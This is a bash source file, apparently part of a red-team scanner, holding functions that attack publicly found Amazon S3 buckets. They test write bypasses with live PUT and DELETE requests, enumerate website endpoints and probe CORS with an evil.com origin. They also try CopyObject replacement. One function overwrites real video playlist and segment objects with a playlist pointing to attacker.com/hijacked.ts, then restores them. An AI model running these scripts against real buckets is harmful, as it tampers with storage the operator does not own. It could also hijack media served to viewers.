rt_181_s3_subpath_write_bypass() {
    local target="${1:-$TARGET}"
    _section "[RT-181] S3 SUBPATH WRITE BYPASS"
    run "Testing if root PUT is blocked but subpaths remain writable..."
    > "$SESSION/rt/s3_subpath_bypass.txt"
    [[ -f "$SESSION/rt/s3_buckets.txt" ]] || { info "No S3 buckets found"; return; }
    local buckets=$(grep -oP 'PUBLIC S3: \K[^ ]+' "$SESSION/rt/s3_buckets.txt" 2>/dev/null)
    for bucket in $buckets; do
        local root_put=$(curl -ski -X PUT --max-time 8 \
            -H "Content-Type: text/plain" -d "root_test" \
            "https://${bucket}/root_test_$$.txt" 2>/dev/null)
        local root_blocked=$(echo "$root_put" | grep -q '403\|AccessDenied' && echo "1" || echo "0")
        local sub_put=$(curl -ski -X PUT --max-time 8 \
            -H "Content-Type: text/plain" -d "sub_test" \
            "https://${bucket}/test/sub_test_$$.txt" 2>/dev/null)
        local sub_works=$(echo "$sub_put" | grep -q '200 OK' && echo "1" || echo "0")
        [ "$root_blocked" = "1" ] && [ "$sub_works" = "1" ] && {
            echo "SUBPATH BYPASS: ${bucket} — root blocked, subpaths OPEN!" >> "$SESSION/rt/s3_subpath_bypass.txt"
            rt "S3 subpath bypass on ${bucket}!"
            curl -ski -X DELETE --max-time 5 "https://${bucket}/test/sub_test_$$.txt" 2>/dev/null >/dev/null
        }
        [ "$root_blocked" = "0" ] && [ "$sub_works" = "1" ] && {
            echo "FULL WRITE: ${bucket} — root AND subpaths writable" >> "$SESSION/rt/s3_subpath_bypass.txt"
            curl -ski -X DELETE --max-time 5 "https://${bucket}/root_test_$$.txt" 2>/dev/null >/dev/null
            curl -ski -X DELETE --max-time 5 "https://${bucket}/test/sub_test_$$.txt" 2>/dev/null >/dev/null
        }
    done
    [ -s "$SESSION/rt/s3_subpath_bypass.txt" ] || info "No S3 subpath bypass found"
}

rt_182_s3_video_content_hijack() {
    local target="${1:-$TARGET}"
    _section "[RT-182] S3 VIDEO CONTENT HIJACK"
    run "Testing if we can overwrite video segments in writable S3..."
    > "$SESSION/rt/s3_video_hijack.txt"
    [[ -f "$SESSION/rt/s3_subpath_bypass.txt" ]] || { info "No subpath bypass found"; return; }
    local buckets=$(grep -oP '(SUBPATH BYPASS|FULL WRITE): \K[^ ]+' "$SESSION/rt/s3_subpath_bypass.txt" 2>/dev/null)
    for bucket in $buckets; do
        local objs=$(curl -sk --max-time 10 "https://${bucket}/?list-type=2&max-keys=100" 2>/dev/null | \
            grep -oP '(?<=<Key>)[^<]+' | grep -iE '\.m3u8$|\.ts$|\.mp4$|\.webm$' | head -5)
        for obj in $objs; do
            local orig=$(curl -sk --max-time 8 "https://${bucket}/${obj}" 2>/dev/null)
            [ -n "$orig" ] && {
                local hijack_put=$(curl -ski -X PUT --max-time 10 \
                    -d '#EXTM3U\n#EXT-X-VERSION:3\n#EXTINF:10.0,\nhttps://attacker.com/hijacked.ts\n#EXT-X-ENDLIST' \
                    "https://${bucket}/${obj}" 2>/dev/null)
                echo "$hijack_put" | grep -q '200 OK' && {
                    echo "VIDEO HIJACK: ${bucket}/${obj} — OVERWRITTEN!" >> "$SESSION/rt/s3_video_hijack.txt"
                    rt "S3 video hijack on ${bucket}/${obj}!"
                    curl -ski -X PUT --max-time 10 --data-binary "$orig" \
                        "https://${bucket}/${obj}" 2>/dev/null >/dev/null
                    echo "VIDEO RESTORED: ${bucket}/${obj}" >> "$SESSION/rt/s3_video_hijack.txt"
                }
                break
            }
        done
    done
    [ -s "$SESSION/rt/s3_video_hijack.txt" ] || info "No S3 video hijack possible"
}

rt_183_s3_website_endpoint_enum() {
    local target="${1:-$TARGET}"
    _section "[RT-183] S3 WEBSITE ENDPOINT ENUMERATION"
    run "Testing all S3 website endpoints for direct access..."
    > "$SESSION/rt/s3_website_endpoints.txt"
    [[ -f "$SESSION/rt/s3_buckets.txt" ]] || { info "No S3 buckets found"; return; }
    local buckets=$(grep -oP 'PUBLIC S3: \K[^ ]+' "$SESSION/rt/s3_buckets.txt" 2>/dev/null)
    local REGIONS=("us-east-1" "us-west-1" "us-west-2" "eu-west-1" "eu-central-1" "ap-northeast-1" "ap-southeast-1")
    for bucket in $buckets; do
        for region in "${REGIONS[@]}"; do
            local code=$(curl -sko /dev/null -w "%{http_code}" --max-time 5 \
                "http://${bucket}.s3-website-${region}.amazonaws.com/" 2>/dev/null)
            [ "$code" = "200" ] || [ "$code" = "301" ] || [ "$code" = "302" ] && {
                echo "WEBSITE: ${bucket}.s3-website-${region}.amazonaws.com (HTTP ${code})" >> "$SESSION/rt/s3_website_endpoints.txt"
                rt "S3 website endpoint found: ${region}!"
            }
        done
    done
    [ -s "$SESSION/rt/s3_website_endpoints.txt" ] || info "No S3 website endpoints found"
}

rt_184_s3_cors_misconfiguration() {
    local target="${1:-$TARGET}"
    _section "[RT-184] S3 CORS MISCONFIGURATION"
    run "Testing S3 buckets for overly permissive CORS..."
    > "$SESSION/rt/s3_cors.txt"
    [[ -f "$SESSION/rt/s3_buckets.txt" ]] || { info "No S3 buckets found"; return; }
    local buckets=$(grep -oP 'PUBLIC S3: \K[^ ]+' "$SESSION/rt/s3_buckets.txt" 2>/dev/null)
    for bucket in $buckets; do
        local cors=$(curl -ski --max-time 8 \
            -H "Origin: https://evil.com" \
            "https://${bucket}/?cors" 2>/dev/null)
        echo "$cors" | grep -qiE '<AllowedOrigin>\*</AllowedOrigin>|<AllowedMethod>PUT</AllowedMethod>' && {
            echo "CORS MISCONFIG: ${bucket} allows cross-origin writes" >> "$SESSION/rt/s3_cors.txt"
            rt "S3 CORS misconfiguration on ${bucket}!"
        }
    done
    [ -s "$SESSION/rt/s3_cors.txt" ] || info "No S3 CORS misconfigurations"
}

rt_185_s3_copy_object_lateral() {
    local target="${1:-$TARGET}"
    _section "[RT-185] S3 COPY OBJECT LATERAL MOVEMENT"
    run "Using S3 CopyObject to move/replace files within bucket..."
    > "$SESSION/rt/s3_copy_lateral.txt"
    [[ -f "$SESSION/rt/s3_writable.txt" ]] || { info "No writable S3 found"; return; }
    local buckets=$(grep -oP 'WRITABLE S3: \K[^ ]+' "$SESSION/rt/s3_writable.txt" 2>/dev/null)
    for bucket in $buckets; do
        local src_obj=$(curl -sk --max-time 8 "https://${bucket}/?list-type=2&max-keys=1" 2>/dev/null | \
            grep -oP '(?<=<Key>)[^<]+' | head -1)
        [ -n "$src_obj" ] && {
            local copy_resp=$(curl -ski -X PUT --max-time 8 \
                -H "x-amz-copy-source: /${bucket}/${src_obj}" \
                "https://${bucket}/copy_test_$$" 2>/dev/null)
            echo "$copy_resp" | grep -q '200 OK' && {
                echo "COPY LATERAL: ${bucket} — CopyObject works for file replacement!" >> "$SESSION/rt/s3_copy_lateral.txt"
                curl -ski -X DELETE --max-time 5 "https://${bucket}/copy_test_$$" 2>/dev/null >/dev/null
                rt "S3 CopyObject lateral on ${bucket}!"
            }
        }
    done
    [ -s "$SESSION/rt/s3_copy_lateral.txt" ] || info "No S3 CopyObject lateral movement"
}

